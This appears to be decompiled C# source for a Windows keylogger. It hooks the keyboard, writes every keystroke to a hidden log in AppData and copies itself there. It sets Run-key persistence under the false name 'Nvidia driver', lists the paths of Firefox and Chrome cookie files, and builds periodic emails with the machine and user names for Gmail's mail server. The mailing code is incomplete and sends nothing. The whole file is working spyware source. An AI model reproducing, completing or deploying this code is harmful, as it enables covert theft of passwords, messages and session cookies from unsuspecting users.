using System;
using System.Diagnostics;
using System.IO;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Timers;
using System.Windows.Forms;
using Microsoft.Win32;

namespace project;

internal class Program
{
	private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

	private const int WH_KEYBOARD_LL = 13;

	private const int WM_KEYDOWN = 256;

	private static LowLevelKeyboardProc _proc = HookCallback;

	private static IntPtr _hookID = IntPtr.Zero;

	public static string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "ati.log");

	public static byte caps = 0;

	public static byte shift = 0;

	public static byte failed = 0;

	public static byte counter = 0;

	public static string path_folder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "appdata");

	public static string path_ff = "C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\lynb2m8d.default\\cookies.sqlite";

	public static string path_cc = "C:\\Users\\" + Environment.UserName + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies";

	public static string x = "";

	public static string y = "";

	public static string z = "";

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool UnhookWindowsHookEx(IntPtr hhk);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	private static extern IntPtr GetModuleHandle(string lpModuleName);

	public static void Main()
	{
		if (failed == 0)
		{
			File.WriteAllText(path, "");
		}
		_hookID = SetHook(_proc);
		startup();
		Mail(x, y, z);
		Timer timer = new Timer();
		timer.Elapsed += OnTimedEvent;
		timer.AutoReset = true;
		timer.Interval = 600000.0;
		timer.Start();
		Application.Run();
		GC.KeepAlive(timer);
		UnhookWindowsHookEx(_hookID);
	}

	public static void startup()
	{
		string text = Application.get_ExecutablePath().ToString();
		string text2 = text;
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		folderPath = Path.Combine(folderPath, "ati.exe");
		try
		{
			File.Copy(text, folderPath, overwrite: false);
			text = folderPath;
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			if (registryKey.GetValue("Nvidia driver") == null)
			{
				registryKey.SetValue("Nvidia driver", folderPath);
			}
			registryKey.Close();
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			if (registryKey.GetValue("Nvidia driver") == null)
			{
				registryKey.SetValue("Nvidia driver", text);
			}
			registryKey.Close();
		}
		catch
		{
		}
		if (text != text2)
		{
			try
			{
				Process.Start(text);
				Environment.Exit(0);
			}
			catch
			{
				Environment.Exit(0);
			}
		}
	}

	public static void OnTimedEvent(object sender, EventArgs e)
	{
		counter++;
		Mail(x, y, z);
	}

	public static void Mail(string x, string y, string z)
	{
		if (!Directory.Exists(path_folder))
		{
			Directory.CreateDirectory(path_folder);
		}
		MailMessage mailMessage = new MailMessage();
		mailMessage.To.Add(x);
		mailMessage.From = new MailAddress(y);
		mailMessage.Subject = Environment.MachineName + "--" + counter + "--" + Environment.UserName;
		mailMessage.SubjectEncoding = Encoding.UTF8;
		if (counter == 0)
		{
			mailMessage.Body = "Welcome 2 Pan Yaki...." + Environment.MachineName + "----" + Environment.UserName + "---- is online";
		}
		else
		{
			mailMessage.Body = "Welcome 2 Pan Yaki....";
		}
		mailMessage.BodyEncoding = Encoding.UTF8;
		mailMessage.IsBodyHtml = false;
		mailMessage.Priority = MailPriority.Normal;
		new SmtpClient("smtp.gmail.com");
	}

	private static IntPtr SetHook(LowLevelKeyboardProc proc)
	{
		using Process process = Process.GetCurrentProcess();
		using ProcessModule processModule = process.MainModule;
		return SetWindowsHookEx(13, proc, GetModuleHandle(processModule.ModuleName), 0u);
	}

	private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
	{
		//IL_0036: Unknown result type (might be due to invalid IL or missing references)
		//IL_003b: Invalid comparison between I4 and Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_004b: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Invalid comparison between Unknown and I4
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_0057: Unknown result type (might be due to invalid IL or missing references)
		//IL_0125: Expected I4, but got Unknown
		//IL_0125: Unknown result type (might be due to invalid IL or missing references)
		//IL_0129: Unknown result type (might be due to invalid IL or missing references)
		//IL_013b: Expected I4, but got Unknown
		//IL_013b: Unknown result type (might be due to invalid IL or missing references)
		//IL_013f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0175: Expected I4, but got Unknown
		//IL_053f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0546: Unknown result type (might be due to invalid IL or missing references)
		//IL_05d0: Expected I4, but got Unknown
		//IL_05d0: Unknown result type (might be due to invalid IL or missing references)
		//IL_05d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_05ed: Expected I4, but got Unknown
		//IL_05ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_05f4: Invalid comparison between Unknown and I4
		StreamWriter streamWriter;
		int num;
		if (nCode >= 0 && wParam == (IntPtr)256)
		{
			streamWriter = File.AppendText(path);
			num = Marshal.ReadInt32(lParam);
			if (65536 == (int)Control.get_ModifierKeys())
			{
				shift = 1;
			}
			Keys val = (Keys)num;
			if ((int)val <= 123)
			{
				switch (val - 8)
				{
				case 0:
					goto IL_023a;
				case 1:
					goto IL_024a;
				case 5:
					goto IL_025a;
				case 11:
					goto IL_026a;
				case 12:
					goto IL_027a;
				case 19:
					goto IL_029d;
				case 24:
					goto IL_02ad;
				case 25:
					goto IL_02bd;
				case 26:
					goto IL_02cd;
				case 27:
					goto IL_02dd;
				case 28:
					goto IL_02ed;
				case 29:
					goto IL_02fd;
				case 30:
					goto IL_030d;
				case 31:
					goto IL_031d;
				case 32:
					goto IL_032d;
				case 34:
					goto IL_033d;
				case 36:
					goto IL_034d;
				case 37:
					goto IL_035d;
				case 38:
					goto IL_036d;
				case 40:
					goto IL_037d;
				case 41:
					goto IL_03aa;
				case 42:
					goto IL_03d7;
				case 43:
					goto IL_0404;
				case 44:
					goto IL_0431;
				case 45:
					goto IL_045e;
				case 46:
					goto IL_048b;
				case 47:
					goto IL_04b8;
				case 48:
					goto IL_04e5;
				case 49:
					goto IL_0512;
				case 2:
				case 3:
				case 4:
				case 6:
				case 7:
				case 8:
				case 9:
				case 10:
				case 13:
				case 14:
				case 15:
				case 16:
				case 17:
				case 18:
				case 20:
				case 21:
				case 22:
				case 23:
				case 33:
				case 35:
				case 39:
					goto IL_071f;
				}
				switch (val - 91)
				{
				case 0:
				case 1:
				case 2:
					goto IL_069f;
				}
				switch (val - 112)
				{
				case 0:
					break;
				case 1:
					goto IL_018a;
				case 2:
					goto IL_019a;
				case 3:
					goto IL_01aa;
				case 4:
					goto IL_01ba;
				case 5:
					goto IL_01ca;
				case 6:
					goto IL_01da;
				case 7:
					goto IL_01ea;
				case 8:
					goto IL_01fa;
				case 9:
					goto IL_020a;
				case 10:
					goto IL_021a;
				case 11:
					goto IL_022a;
				default:
					goto IL_071f;
				}
				streamWriter.Write("[f.1]");
			}
			else
			{
				switch (val - 160)
				{
				case 0:
				case 1:
				case 2:
				case 3:
				case 4:
				case 5:
					goto IL_069f;
				case 13:
					goto IL_06af;
				case 14:
					goto IL_06bf;
				case 15:
					goto IL_06cf;
				case 16:
					goto IL_06df;
				case 17:
					goto IL_06ef;
				case 18:
					goto IL_06ff;
				case 19:
					goto IL_070f;
				case 6:
				case 7:
				case 8:
				case 9:
				case 10:
				case 11:
				case 12:
				case 20:
				case 21:
				case 22:
				case 23:
				case 24:
				case 25:
					goto IL_071f;
				case 26:
					goto IL_07dd;
				case 27:
					goto IL_080a;
				case 28:
					goto IL_0837;
				case 29:
					goto IL_0864;
				case 30:
					goto IL_088e;
				case 31:
					goto IL_08b5;
				case 32:
					goto IL_08dc;
				}
				switch (val - 219)
				{
				case 0:
					goto IL_060b;
				case 1:
					goto IL_0638;
				case 2:
					goto IL_0648;
				case 3:
					goto IL_0675;
				}
				if ((int)val != 262144)
				{
					goto IL_071f;
				}
				streamWriter.Write("[alt]");
			}
			goto IL_0901;
		}
		goto IL_090d;
		IL_01ea:
		streamWriter.Write("[f.8]");
		goto IL_0901;
		IL_01da:
		streamWriter.Write("[f.7]");
		goto IL_0901;
		IL_01ba:
		streamWriter.Write("[f.5]");
		goto IL_0901;
		IL_01ca:
		streamWriter.Write("[f.6]");
		goto IL_0901;
		IL_01aa:
		streamWriter.Write("[f.4]");
		goto IL_0901;
		IL_0512:
		if (shift == 0)
		{
			streamWriter.Write("9");
		}
		else
		{
			streamWriter.Write("(");
		}
		goto IL_0901;
		IL_08dc:
		if (shift == 0)
		{
			streamWriter.Write("`");
		}
		else
		{
			streamWriter.Write("~");
		}
		goto IL_0901;
		IL_06cf:
		streamWriter.Write("[vol_up]");
		goto IL_0901;
		IL_04e5:
		if (shift == 0)
		{
			streamWriter.Write("8");
		}
		else
		{
			streamWriter.Write("*");
		}
		goto IL_0901;
		IL_06bf:
		streamWriter.Write("[vol_down]");
		goto IL_0901;
		IL_08b5:
		if (shift == 0)
		{
			streamWriter.Write("/");
		}
		else
		{
			streamWriter.Write("?");
		}
		goto IL_0901;
		IL_04b8:
		if (shift == 0)
		{
			streamWriter.Write("7");
		}
		else
		{
			streamWriter.Write("&");
		}
		goto IL_0901;
		IL_0648:
		if (shift == 0)
		{
			streamWriter.Write("]");
		}
		else
		{
			streamWriter.Write("}");
		}
		goto IL_0901;
		IL_06af:
		streamWriter.Write("[vol_mute]");
		goto IL_0901;
		IL_048b:
		if (shift == 0)
		{
			streamWriter.Write("6");
		}
		else
		{
			streamWriter.Write("^");
		}
		goto IL_0901;
		IL_088e:
		if (shift == 0)
		{
			streamWriter.Write(".");
		}
		else
		{
			streamWriter.Write(">");
		}
		goto IL_0901;
		IL_069f:
		streamWriter.Write("");
		goto IL_0901;
		IL_045e:
		if (shift == 0)
		{
			streamWriter.Write("5");
		}
		else
		{
			streamWriter.Write("%");
		}
		goto IL_0901;
		IL_0638:
		streamWriter.Write("|");
		goto IL_0901;
		IL_0864:
		if (shift == 0)
		{
			streamWriter.Write("-");
		}
		else
		{
			streamWriter.Write("_");
		}
		goto IL_0901;
		IL_0431:
		if (shift == 0)
		{
			streamWriter.Write("4");
		}
		else
		{
			streamWriter.Write("$");
		}
		goto IL_0901;
		IL_060b:
		if (shift == 0)
		{
			streamWriter.Write("[");
		}
		else
		{
			streamWriter.Write("{");
		}
		goto IL_0901;
		IL_06ff:
		streamWriter.Write("[media_stop]");
		goto IL_0901;
		IL_0404:
		if (shift == 0)
		{
			streamWriter.Write("3");
		}
		else
		{
			streamWriter.Write("#");
		}
		goto IL_0901;
		IL_0837:
		if (shift == 0)
		{
			streamWriter.Write(",");
		}
		else
		{
			streamWriter.Write("<");
		}
		goto IL_0901;
		IL_0675:
		if (shift == 0)
		{
			streamWriter.Write("'");
		}
		else
		{
			streamWriter.Write('"');
		}
		goto IL_0901;
		IL_03d7:
		if (shift == 0)
		{
			streamWriter.Write("2");
		}
		else
		{
			streamWriter.Write("@");
		}
		goto IL_0901;
		IL_06ef:
		streamWriter.Write("[media_prev]");
		goto IL_0901;
		IL_080a:
		if (shift == 0)
		{
			streamWriter.Write("=");
		}
		else
		{
			streamWriter.Write("+");
		}
		goto IL_0901;
		IL_03aa:
		if (shift == 0)
		{
			streamWriter.Write("1");
		}
		else
		{
			streamWriter.Write("!");
		}
		goto IL_0901;
		IL_071f:
		if (shift == 0 && caps == 0)
		{
			streamWriter.Write(((object)(Keys)num).ToString()!.ToLower());
		}
		if (shift == 1 && caps == 0)
		{
			streamWriter.Write(((object)(Keys)num).ToString()!.ToUpper());
		}
		if (shift == 0 && caps == 1)
		{
			streamWriter.Write(((object)(Keys)num).ToString()!.ToUpper());
		}
		if (shift == 1 && caps == 1)
		{
			streamWriter.Write(((object)(Keys)num).ToString()!.ToLower());
		}
		goto IL_0901;
		IL_0901:
		shift = 0;
		streamWriter.Close();
		goto IL_090d;
		IL_037d:
		if (shift == 0)
		{
			streamWriter.Write("0");
		}
		else
		{
			streamWriter.Write(")");
		}
		goto IL_0901;
		IL_07dd:
		if (shift == 0)
		{
			streamWriter.Write(";");
		}
		else
		{
			streamWriter.Write(":");
		}
		goto IL_0901;
		IL_090d:
		return CallNextHookEx(_hookID, nCode, wParam, lParam);
		IL_036d:
		streamWriter.Write("[dl]");
		goto IL_0901;
		IL_035d:
		streamWriter.Write("[insert]");
		goto IL_0901;
		IL_034d:
		streamWriter.Write("[prnt_scrn]");
		goto IL_0901;
		IL_033d:
		streamWriter.Write("[print]");
		goto IL_0901;
		IL_032d:
		streamWriter.Write("[a_dwn]");
		goto IL_0901;
		IL_031d:
		streamWriter.Write("[a_rgt]");
		goto IL_0901;
		IL_030d:
		streamWriter.Write("[a_up]");
		goto IL_0901;
		IL_02fd:
		streamWriter.Write("[a_lft]");
		goto IL_0901;
		IL_02ed:
		streamWriter.Write("[home]");
		goto IL_0901;
		IL_02dd:
		streamWriter.Write("[end]");
		goto IL_0901;
		IL_02cd:
		streamWriter.Write("[p_down]");
		goto IL_0901;
		IL_02bd:
		streamWriter.Write("[p_up]");
		goto IL_0901;
		IL_02ad:
		streamWriter.Write("[sb]");
		goto IL_0901;
		IL_029d:
		streamWriter.Write("[esc]");
		goto IL_0901;
		IL_027a:
		if (caps == 0)
		{
			caps = 1;
		}
		else
		{
			caps = 0;
		}
		goto IL_0901;
		IL_06df:
		streamWriter.Write("[media_next]");
		goto IL_0901;
		IL_070f:
		streamWriter.Write("[media_play/pause]");
		goto IL_0901;
		IL_026a:
		streamWriter.Write("[pause]");
		goto IL_0901;
		IL_025a:
		streamWriter.WriteLine("");
		goto IL_0901;
		IL_024a:
		streamWriter.Write("[tab]");
		goto IL_0901;
		IL_023a:
		streamWriter.Write("[bs]");
		goto IL_0901;
		IL_018a:
		streamWriter.Write("[f.2]");
		goto IL_0901;
		IL_019a:
		streamWriter.Write("[f.3]");
		goto IL_0901;
		IL_022a:
		streamWriter.Write("[f.12]");
		goto IL_0901;
		IL_021a:
		streamWriter.Write("[f.11]");
		goto IL_0901;
		IL_020a:
		streamWriter.Write("[f.10]");
		goto IL_0901;
		IL_01fa:
		streamWriter.Write("[f.9]");
		goto IL_0901;
	}
}
